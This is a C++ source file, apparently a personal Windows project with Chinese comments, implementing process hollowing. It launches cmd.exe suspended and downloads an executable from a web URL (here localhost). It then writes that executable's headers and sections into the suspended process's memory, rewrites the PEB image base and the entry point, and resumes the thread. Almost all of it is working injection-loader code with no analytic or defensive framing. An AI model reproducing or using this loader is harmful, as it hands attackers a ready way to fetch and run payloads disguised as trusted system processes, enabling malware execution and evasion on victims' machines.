// FakeProcess.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "FakeProcess.h"
#include "MyHttpHelper.hpp"
#include <wininet.h>  

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 唯一的应用程序对象

CWinApp theApp;

using namespace std;
typedef ULONG(WINAPI *NtUnmapViewOfSection) (HANDLE hProcess, PVOID lpBaseAddress);

int main()
{
    int nRetCode = 0;

    HMODULE hModule = ::GetModuleHandle(nullptr);

    if (hModule != nullptr)
    {
        // 初始化 MFC 并在失败时显示错误
        if (!AfxWinInit(hModule, nullptr, ::GetCommandLine(), 0))
        {
            // TODO: 更改错误代码以符合您的需要
            wprintf(L"错误: MFC 初始化失败\n");
            nRetCode = 1;
        }
        else
        {
		  STARTUPINFO si = {0};
		  PROCESS_INFORMATION pi = { 0 };
		  si.cb = sizeof(si);
		  //创建进程
		  CString cmd_path = L"C:\\Windows\\System32\\cmd.exe";
		  //CString cmd_path = L"C:\\Windows\\System32\\mspaint.exe";
		  if (!CreateProcess(cmd_path, L"", NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
			  cout << "CreateProcess Error!"<<endl;
			  return 0 ;
		  }
		  //获取线程上下文
		  CONTEXT stThreadContext = {0};
		  stThreadContext.ContextFlags = CONTEXT_FULL;
		  if (!GetThreadContext(pi.hThread, &stThreadContext)) {
			  cout << "GetThreadContext Error!" << endl;
			  return 0;
		  }
		  //清空目标进程
		  DWORD dwProcessBaseAddr = 0;
		  if (!ReadProcessMemory(pi.hProcess, (LPVOID)(stThreadContext.Ebx + 8), &dwProcessBaseAddr, sizeof(DWORD), NULL)) {
			  cout << "ReadProcessMemory Error";
			  return false;
		  }

		  //获取函数NtUnmapViewOfSection地址
		  HMODULE hNtModule = GetModuleHandle(_T("ntdll.dll"));
		  if (hNtModule == NULL)
		  {
			  return FALSE;
		  }
		  NtUnmapViewOfSection pfnNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtModule, "NtUnmapViewOfSection");
		  if (pfnNtUnmapViewOfSection == NULL)
		  {
			  return FALSE;
		  }

		  //读取文件
		  /*auto hFile = CreateFile(L"C:\\Users\\jiang\\Documents\\Visual Studio 2015\\Projects\\FakeProcess\\test.exe", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		  if (hFile == INVALID_HANDLE_VALUE) {
			  return false;
		  }
		  DWORD dwFileSize = GetFileSize(hFile, 0);
		  char* lpbuffer = new char[dwFileSize];
		  ReadFile(hFile, lpbuffer, dwFileSize, NULL, NULL);
		  */
		  HINTERNET hSession = InternetOpen(L"RookIE/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		  HINTERNET handle2 = InternetOpenUrl(hSession, L"http://127.0.0.1/test.exe", NULL, 0, INTERNET_FLAG_DONT_CACHE, 0);
		  CHAR* lpbuffer = new char[1024 * 1024 * 10];
		  ZeroMemory(lpbuffer, 1024 * 1024 * 10);
		  DWORD dwFileSize = 0;
		  int ptr = 0;
		  DWORD dwRead = 0 ;
		  do {
			  InternetReadFile(handle2, lpbuffer +ptr*1024, 1024, &dwRead);
			  dwFileSize += dwRead;
			  ptr++;
		  } while (dwRead != 0);
		  

		  //获取NT文件头信息
		  PIMAGE_DOS_HEADER pDosHeader;
		  PIMAGE_NT_HEADERS pNtHeaders;
		  pDosHeader = (PIMAGE_DOS_HEADER)lpbuffer;
		  if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		  {
			  return FALSE;
		  }
		  pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpbuffer + pDosHeader->e_lfanew);
		  if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
		  {
			  return FALSE;
		  }

		  //申请内存
		  LPVOID lpPuppetProcessBaseAddr = VirtualAllocEx(pi.hProcess,
			  (LPVOID)pNtHeaders->OptionalHeader.ImageBase,
			  pNtHeaders->OptionalHeader.SizeOfImage,
			  MEM_COMMIT | MEM_RESERVE,
			  PAGE_EXECUTE_READWRITE);
		  if (lpPuppetProcessBaseAddr == NULL)
		  {
			  return FALSE;
		  }

		  // 替换PE头
		  BOOL bRet = WriteProcessMemory(pi.hProcess, lpPuppetProcessBaseAddr, lpbuffer, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
		  if (!bRet)
		  {
			  return FALSE;
		  }
		  // 替换节
		  LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)lpbuffer + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
		  PIMAGE_SECTION_HEADER pSectionHeader;
		  for (DWORD dwIndex = 0; dwIndex < pNtHeaders->FileHeader.NumberOfSections; ++dwIndex)
		  {
			  pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;
			  bRet = WriteProcessMemory(pi.hProcess,
				  (LPVOID)((DWORD)lpPuppetProcessBaseAddr + pSectionHeader->VirtualAddress),
				  (LPCVOID)((DWORD)lpbuffer + pSectionHeader->PointerToRawData),
				  pSectionHeader->SizeOfRawData,
				  NULL);
			  if (!bRet)
			  {
				  return FALSE;
			  }
			  lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr + sizeof(IMAGE_SECTION_HEADER));
		  }

		  // Replace the value of base address in the PEB
		  DWORD dwImageBase = pNtHeaders->OptionalHeader.ImageBase;
		  bRet = WriteProcessMemory(pi.hProcess, (LPVOID)(stThreadContext.Ebx + 8), (LPCVOID)&dwImageBase, sizeof(PVOID), NULL);
		  if (!bRet)
		  {
			  return FALSE;
		  }
		  // Replace Entry Point Address
		  stThreadContext.Eax = dwImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint;
		  bRet = SetThreadContext(pi.hThread, &stThreadContext);
		  if (!bRet)
		  {
			  return FALSE;
		  }
		  ResumeThread(pi.hThread);
		  system("pause");
        }
    }
    else
    {
        // TODO: 更改错误代码以符合您的需要
        wprintf(L"错误: GetModuleHandle 失败\n");
        nRetCode = 1;
    }

    return nRetCode;
}
